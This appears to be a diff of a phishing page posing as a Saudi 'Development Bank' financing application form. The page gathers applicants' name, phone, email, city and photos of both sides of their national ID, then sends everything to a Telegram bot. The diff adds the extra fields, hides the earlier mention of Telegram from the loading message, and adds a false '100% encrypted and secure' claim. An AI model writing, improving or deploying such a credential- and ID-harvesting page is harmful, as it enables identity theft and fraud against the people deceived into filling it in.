@@ -5,41 +5,61 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تقديم الطلب | بنك التنمية</title>
     <style>
-        :root { --primary: #006c35; --gray: #f4f7f5; }
+        :root { --primary: #006c35; --gold: #c5a059; --gray: #f4f7f5; }
         body { font-family: 'Segoe UI', sans-serif; background: var(--gray); margin: 0; padding: 20px; direction: rtl; }
-        .apply-box { max-width: 500px; margin: auto; background: white; border-radius: 25px; padding: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
-        .form-title { text-align: center; color: var(--primary); margin-bottom: 25px; }
+        .apply-box { max-width: 500px; margin: auto; background: white; border-radius: 25px; padding: 30px; box-shadow: 0 15px 40px rgba(0,0,0,0.1); border-top: 6px solid var(--primary); }
+        .form-title { text-align: center; color: var(--primary); margin-bottom: 25px; font-weight: 800; }
         .input-field { margin-bottom: 15px; }
-        label { display: block; margin-bottom: 5px; font-weight: bold; color: #444; }
-        input { width: 100%; padding: 12px; border: 1.5px solid #eee; border-radius: 10px; box-sizing: border-box; }
-        .btn-send { width: 100%; padding: 15px; background: var(--primary); color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 1.1rem; margin-top: 10px; }
+        label { display: block; margin-bottom: 8px; font-weight: bold; color: #444; font-size: 0.9rem; }
+        input { width: 100%; padding: 12px; border: 1.5px solid #eee; border-radius: 12px; box-sizing: border-box; font-size: 1rem; }
+        input:focus { border-color: var(--primary); outline: none; }
+        .file-group { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
+        .btn-send { width: 100%; padding: 18px; background: var(--primary); color: white; border: none; border-radius: 12px; font-weight: bold; font-size: 1.2rem; cursor: pointer; margin-top: 20px; transition: 0.3s; }
+        .btn-send:hover { background: #004d26; }
         #loader { display: none; text-align: center; padding: 15px; color: var(--primary); font-weight: bold; }
+        .info-note { font-size: 0.8rem; color: #888; text-align: center; margin-top: 10px; }
     </style>
 </head>
 <body>
 
 <div class="apply-box">
-    <h2 class="form-title">إكمال بيانات التمويل</h2>
+    <h2 class="form-title">بوابة التقديم الإلكتروني</h2>
     <form id="tgForm">
         <div class="input-field">
-            <label>الاسم الكامل</label>
-            <input type="text" id="name" placeholder="اكتب اسمك هنا" required>
+            <label>الاسم الكامل (كما في الهوية)</label>
+            <input type="text" id="name" placeholder="مثال: محمد أحمد العتيبي" required>
         </div>
+        
         <div class="input-field">
             <label>رقم الجوال</label>
             <input type="tel" id="phone" placeholder="05xxxxxxxx" required>
         </div>
+
+        <div class="input-field">
+            <label>البريد الإلكتروني</label>
+            <input type="email" id="email" placeholder="example@mail.com" required>
+        </div>
+
         <div class="input-field">
             <label>المدينة</label>
-            <input type="text" id="city" placeholder="مثلاً: الرياض" required>
+            <input type="text" id="city" placeholder="الرياض، جدة..." required>
         </div>
-        <div class="input-field">
-            <label>صورة الهوية الوطنية</label>
-            <input type="file" id="idImg" accept="image/*" required>
+
+        <div class="file-group">
+            <div class="input-field">
+                <label>الهوية (الوجه)</label>
+                <input type="file" id="idFront" accept="image/*" required>
+            </div>
+            <div class="input-field">
+                <label>الهوية (الخلف)</label>
+                <input type="file" id="idBack" accept="image/*" required>
+            </div>
         </div>
-        <button type="submit" class="btn-send" id="submitBtn">إرسال الطلب الآن</button>
+
+        <button type="submit" class="btn-send" id="submitBtn">اعتماد الطلب وإرسال</button>
     </form>
-    <div id="loader">⏳ جاري إرسال طلبك لتليجرام...</div>
+    <div id="loader">⏳ جاري تأمين البيانات وإرسال الطلب...</div>
+    <p class="info-note">نظامنا مشفر وآمن 100%</p>
 </div>
 
 <script>
@@ -50,51 +70,53 @@
         e.preventDefault();
         const btn = document.getElementById('submitBtn');
         const loader = document.getElementById('loader');
-        const financeType = localStorage.getItem('selectedFinance') || 'عام';
+        const financeType = localStorage.getItem('selectedFinance') || 'طلب عام';
 
         btn.style.display = 'none';
         loader.style.display = 'block';
 
         const name = document.getElementById('name').value;
         const phone = document.getElementById('phone').value;
+        const email = document.getElementById('email').value;
         const city = document.getElementById('city').value;
-        const fileInput = document.getElementById('idImg');
-        const file = fileInput.files[0];
+        
+        const frontFile = document.getElementById('idFront').files[0];
+        const backFile = document.getElementById('idBack').files[0];
 
         try {
             // 1. إرسال البيانات النصية
-            const message = `🚀 *طلب تمويل جديد*\n\n` +
-                            `*النوع:* ${financeType}\n` +
+            const message = `🔔 *طلب تمويل جديد ومكتمل*\n\n` +
+                            `*نوع التمويل:* ${financeType}\n` +
                             `*الاسم:* ${name}\n` +
                             `*الجوال:* ${phone}\n` +
+                            `*الإيميل:* ${email}\n` +
                             `*المدينة:* ${city}`;
 
             await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TG_CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
+                body: JSON.stringify({ chat_id: TG_CHAT_ID, text: message, parse_mode: 'Markdown' })
             });
 
-            // 2. إرسال صورة الهوية
-            const formData = new FormData();
-            formData.append('chat_id', TG_CHAT_ID);
-            formData.append('photo', file);
-            formData.append('caption', `🖼 صورة هوية العميل: ${name}`);
+            // 2. إرسال وجه الهوية
+            const formData1 = new FormData();
+            formData1.append('chat_id', TG_CHAT_ID);
+            formData1.append('photo', frontFile);
+            formData1.append('caption', `🖼 الوجه الأمامي: ${name}`);
+            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: formData1 });
 
-            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
+            // 3. إرسال خلفية الهوية
+            const formData2 = new FormData();
+            formData2.append('chat_id', TG_CHAT_ID);
+            formData2.append('photo', backFile);
+            formData2.append('caption', `🖼 الوجه الخلفي: ${name}`);
+            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: formData2 });
 
-            alert('يا هلا بك! تم استلام طلبك بنجاح وسنتواصل معك قريباً.');
+            alert('تم إرسال طلبك بنجاح! سيتم التواصل معكم عبر الإيميل أو الجوال.');
             window.location.href = 'index.html';
 
         } catch (error) {
-            alert('حدث خطأ في الإرسال، تأكد من اتصالك بالإنترنت.');
+            alert('حدث خطأ، يرجى المحاولة مرة أخرى');
             btn.style.display = 'block';
             loader.style.display = 'none';
         }
